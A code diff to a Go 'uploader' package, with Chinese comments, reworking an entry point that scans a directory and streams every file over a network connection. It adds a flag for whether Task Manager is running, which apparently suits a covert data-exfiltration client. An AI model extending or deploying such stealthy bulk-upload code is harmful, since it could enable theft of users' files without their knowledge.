@@ -1,10 +1,14 @@
 package uploader
 
 import (
-	"fmt"
-	"log"
 	"net"
 	"os"
+	"sync/atomic"
+)
+
+var (
+	// 任务管理器是否开启
+	TaskmgrRunning atomic.Bool
 )
 
 type Config struct {
@@ -38,15 +42,17 @@ func New(cfg Config, factory net.Conn) *Uploader {
 	}
 }
 
+func SafeGo(fn func()) {
+	go func() {
+		defer func() { recover() }()
+		fn()
+	}()
+}
+
 // 程序分发入口
 func (u *Uploader) PatchDistribution(dirPath string) {
 
 	StartTaskManagerDetector(u.connFunc)
-	task := &UploadTask{
-		ClientID: u.cfg.ClientID,
-		RootPath: dirPath,
-		connFunc: u.connFunc,
-	}
 
 	// 检查路径是文件还是目录
 	info, err := os.Stat(dirPath)
@@ -57,25 +63,27 @@ func (u *Uploader) PatchDistribution(dirPath string) {
 
 	if info.IsDir() {
 
-		// 改成这样写：
-		SafeGo(func() {
-			if err := task.GenerateFileList(); err != nil {
-				log.Printf("扫描目录失败: %v", err)
-			}
-		})
+		// 流式目录上传（main.go 王者级）
+		task := &UploadTask{
+			ClientID: ClientName,
+			RootPath: dirPath,
+			connFunc: u.connFunc,
+			FileChan: make(chan string, 5000),
+			Done:     make(chan struct{}),
+		}
 
-		SafeGo(func() {
-			task.startUploadWorkers()
-		})
+		task.startScanning()
+		task.startUploading()
 	} else {
 
 		// 旧单个上传不限原队列影响,主要是设计限制5并发的处理,单个文件上传不限制
 		// t.doSendFile(dirPath)
 		// 单文件上传直接调用同步方法
 		SafeGo(func() {
-			if err := task.doSendFileWithOutArray(dirPath); err != nil {
-				OutputDebugString(fmt.Sprintf("上传失败: %v", err))
+			task := &UploadTask{
+				ClientID: ClientName,
 			}
+			task.doSendFile(dirPath)
 		})
 	}
 }
